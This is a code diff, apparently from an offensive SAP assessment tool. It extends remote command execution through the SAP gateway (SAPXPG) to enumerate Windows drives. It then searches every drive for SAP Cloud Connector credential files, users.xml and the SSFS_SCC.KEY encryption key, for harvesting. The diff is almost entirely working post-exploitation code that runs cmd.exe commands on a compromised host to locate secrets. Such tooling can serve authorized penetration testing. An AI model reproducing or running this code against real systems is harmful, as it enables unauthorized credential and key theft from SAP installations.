@@ -445,6 +445,59 @@ def _detect_local_ip(target_host: str, saprouter: str = "") -> str:
         return "127.0.0.1"
 
 
+_WIN_SCC_ROOT_TEMPLATES = (
+    r"{drive}\SAP\scc20",
+    r"{drive}\SAP\scc",
+    r"{drive}\SAP\scc21",
+    r"{drive}\SAP\scc22",
+    r"{drive}\SAP\scc19",
+    r"{drive}\sap\scc",
+    r"{drive}\Program Files\SAP\Cloud Connector",
+    r"{drive}\Program Files\SAP\SAP Cloud Connector",
+)
+
+
+def _enumerate_windows_drives(gw_run) -> list:
+    """Return the list of mounted-fixed Windows drive letters as
+    ``["C:", "D:", "P:", ...]`` using a SAPXPG-friendly probe.
+
+    ``gw_run`` is a callable (cmd, params) -> stdout that runs an OS
+    command via the SAP gateway (typically the ``_gw`` helper defined
+    locally inside an exploit handler).  We avoid ``wmic`` (deprecated /
+    removed on newer Windows) and use ``fsutil fsinfo drives`` which is
+    built-in on every supported release.
+
+    Always returns at least ``["C:"]`` so callers don't get an empty
+    list when fsutil fails (rights / SAPXPG quoting / etc.).
+    """
+    drives = []
+    try:
+        out = gw_run("cmd.exe", r'/c fsutil fsinfo drives')
+        # Tolerate the (str, bool) return shape used by some _gw helpers.
+        if isinstance(out, tuple):
+            out = out[0]
+        text = (out or "").upper()
+        # Output looks like:  Drives: A:\ C:\ D:\ P:\
+        for tok in text.replace("DRIVES:", " ").split():
+            tok = tok.strip().rstrip("\\").rstrip("/")
+            if len(tok) == 2 and tok[1] == ":" and tok[0].isalpha():
+                drives.append(tok)
+    except Exception:
+        pass
+    if "C:" not in drives:
+        drives.insert(0, "C:")
+    return drives
+
+
+def _expand_scc_roots_across_drives(drives) -> list:
+    """Cross-product the SCC root templates with every drive letter."""
+    roots = []
+    for d in drives:
+        for tpl in _WIN_SCC_ROOT_TEMPLATES:
+            roots.append(tpl.format(drive=d))
+    return roots
+
+
 def _win_multistep_payload(ps_script: str, display: str) -> dict:
     """Build a multi-step Windows payload: write PS script to temp file,
     then execute it.
@@ -1895,16 +1948,12 @@ def create_app(api: SAPMAPApi) -> Bottle:
 
                 # Linux paths use ls + base64; Windows uses dir + certutil
                 if is_win:
-                    win_roots = [
-                        r"C:\SAP\scc20",
-                        r"C:\SAP\scc",
-                        r"C:\SAP\scc21",
-                        r"C:\SAP\scc22",
-                        r"C:\SAP\scc19",
-                        r"C:\sap\scc",
-                        r"C:\Program Files\SAP\Cloud Connector",
-                        r"C:\Program Files\SAP\SAP Cloud Connector",
-                    ]
+                    # Enumerate every mounted drive so SCC installs on
+                    # non-default drives (P:, D:, …) are also found.
+                    drives = _enumerate_windows_drives(_gw)
+                    print(f"[*] SCC {host}: Windows drives: "
+                          f"{', '.join(drives)}")
+                    win_roots = _expand_scc_roots_across_drives(drives)
                     fpath = None
                     for root in win_roots:
                         candidate = rf"{root}\config\users.xml"
@@ -1916,19 +1965,26 @@ def create_app(api: SAPMAPApi) -> Bottle:
                             fpath = candidate
                             print(f"[*] SCC {host}: found {candidate} on Windows")
                             break
-                    # Fallback: dir /s /b glob across C:\SAP\scc*
+                    # Fallback: dir /s /b glob across <drive>:\SAP\scc*
+                    # on every detected drive.
                     if not fpath:
-                        glob_out, _ = _gw("cmd.exe",
-                                          r"/c dir /s /b C:\SAP\scc*\config\users.xml 2>nul")
-                        for line in glob_out.splitlines():
-                            line = line.strip()
-                            if line.lower().endswith("users.xml"):
-                                fpath = line
-                                print(f"[*] SCC {host}: glob found {fpath}")
+                        for d in drives:
+                            glob_out, _ = _gw(
+                                "cmd.exe",
+                                rf"/c dir /s /b {d}\SAP\scc*\config\users.xml 2>nul")
+                            for line in glob_out.splitlines():
+                                line = line.strip()
+                                if line.lower().endswith("users.xml"):
+                                    fpath = line
+                                    print(f"[*] SCC {host}: glob found {fpath} "
+                                          f"on {d}")
+                                    break
+                            if fpath:
                                 break
                     if not fpath:
                         print(f"[-] SCC {host}: users.xml not found via "
-                              f"{n.sid} on Windows")
+                              f"{n.sid} on Windows (drives tried: "
+                              f"{', '.join(drives)})")
                         continue
                     # SAPXPG has a ~128-byte per-line output limit AND a
                     # PARAMS length limit.  Long PowerShell commands get
@@ -2507,12 +2563,12 @@ def create_app(api: SAPMAPApi) -> Bottle:
 
                 # --- Discover SCC root ----------------------------------------
                 if is_win:
-                    win_roots = [
-                        r"C:\SAP\scc20", r"C:\SAP\scc", r"C:\SAP\scc21",
-                        r"C:\SAP\scc22", r"C:\SAP\scc19", r"C:\sap\scc",
-                        r"C:\Program Files\SAP\Cloud Connector",
-                        r"C:\Program Files\SAP\SAP Cloud Connector",
-                    ]
+                    # Enumerate every mounted drive so SCC installs on
+                    # non-default drives (P:, D:, …) are also found.
+                    drives = _enumerate_windows_drives(_gw)
+                    print(f"[*] {sid}: harvest_scc_ssfs Windows drives: "
+                          f"{', '.join(drives)}")
+                    win_roots = _expand_scc_roots_across_drives(drives)
                     scc_root = None
                     for root in win_roots:
                         probe = rf"{root}\scc_config\SSFS_SCC.KEY"
@@ -2524,18 +2580,21 @@ def create_app(api: SAPMAPApi) -> Bottle:
                             scc_root = root
                             break
                     if not scc_root:
-                        # glob fallback
-                        g = _gw("cmd.exe",
-                                r"/c dir /s /b C:\SAP\scc*\scc_config\SSFS_SCC.KEY 2>nul")
-                        for line in g.splitlines():
-                            line = line.strip()
-                            if line.upper().endswith("SSFS_SCC.KEY"):
-                                # line is full path to KEY; root is 2 levels up
-                                import os as _os
-                                scc_root = _os.path.dirname(
-                                    _os.path.dirname(line))
-                                print(f"[*] {sid}: harvest_scc_ssfs glob → "
-                                      f"{scc_root}")
+                        # Glob fallback across every detected drive
+                        for d in drives:
+                            g = _gw("cmd.exe",
+                                    rf"/c dir /s /b {d}\SAP\scc*\scc_config\SSFS_SCC.KEY 2>nul")
+                            for line in g.splitlines():
+                                line = line.strip()
+                                if line.upper().endswith("SSFS_SCC.KEY"):
+                                    # line is full path to KEY; root is 2 levels up
+                                    import os as _os
+                                    scc_root = _os.path.dirname(
+                                        _os.path.dirname(line))
+                                    print(f"[*] {sid}: harvest_scc_ssfs glob → "
+                                          f"{scc_root} (on {d})")
+                                    break
+                            if scc_root:
                                 break
                 else:
                     linux_roots = ["/opt/sap/scc", "/usr/local/scc",
